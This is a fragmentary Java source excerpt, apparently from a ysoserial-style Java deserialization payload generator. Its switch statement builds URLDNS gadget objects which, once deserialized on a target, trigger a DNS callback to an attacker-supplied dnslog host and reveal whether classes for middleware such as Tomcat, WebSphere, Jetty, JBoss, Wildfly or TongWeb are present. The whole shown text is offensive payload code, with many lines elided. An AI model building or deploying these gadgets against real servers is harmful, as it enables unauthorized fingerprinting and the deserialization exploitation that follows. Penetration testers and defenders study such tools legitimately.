...
//                list.add(cb110x);
            ...
            case "jdk9_10":
                ...
                break;
            case "Tomcat":
                HashMap tomcat = getURLDNSgadget("http://Tomcat."+dnslog, "org.apache.catalina.core.StandardContext");
                list.add(tomcat);
                break;
            case "Tomcat6":
            ...
            case "Weblogic":
                ...
                break;
            case "WebSphere":
                HashMap websphere = getURLDNSgadget("http://WebSphere."+dnslog, "com.ibm.websphere.scheduler");
                list.add(websphere);
                break;
            case "jetty12":
                HashMap jetty12 = getURLDNSgadget("http://jetty12."+dnslog, "org.eclipse.jetty.http.HttpHeader");
                list.add(jetty12);
                break;
            case "jetty":
                HashMap jetty = getURLDNSgadget("http://jetty."+dnslog, "org.eclipse.jetty.server.HttpConnection");
                list.add(jetty);
                break;
            case "Glassfish":
                HashMap Glassfish = getURLDNSgadget("http://Glassfish."+dnslog, "com.sun.enterprise.glassfish.bootstrap.ASMain");
                list.add(Glassfish);
                break;
            case "resin":
                HashMap resin = getURLDNSgadget("http://resin."+dnslog, "com.caucho.Version");
                list.add(resin);
                break;
            case "undertow":
                HashMap undertow = getURLDNSgadget("http://undertow."+dnslog, "io.undertow.server.Connectors");
                list.add(undertow);
                break;
            case "Jboss":
                HashMap Jboss = getURLDNSgadget("http://Jboss."+dnslog, "org.jboss.modules.CallerContext");
                list.add(Jboss);
                break;
            case "Wildfly":
                HashMap Wildfly = getURLDNSgadget("http://Wildfly."+dnslog, "org.wildfly.security.manager.WildFlySecurityManager");
                list.add(Wildfly);
                break;
            case "jindie":
                HashMap jindie = getURLDNSgadget("http://jindie."+dnslog, "com.apusic.web.http.HttpProtocol");
                list.add(jindie);
                break;
            case "tongweb":
                HashMap tongweb = getURLDNSgadget("http://tongweb."+dnslog, "com.tongweb.web.thor.core.ApplicationContext");
                list.add(tongweb);
                break;
            case "bes":
                HashMap bes = getURLDNSgadget("http://bes."+dnslog, "com.bes.enterprise.webtier.core.DefaultContext");
                list.add(bes);
                break;
            case "netty":
                HashMap netty = getURLDNSgadget("http://netty."+dnslog, "reactor.netty.ConnectionObserver");
                list.add(netty);
                break;
            case "all":
    ...
    private static Class makeClass(String clazzName) throws Exception{
    ...
    public Object getObject(final String command) throws Exception {
        ...
        dnslog = parts[0];
        List arraylistclazz = Arrays.asList(parts[1].split("\\|"));
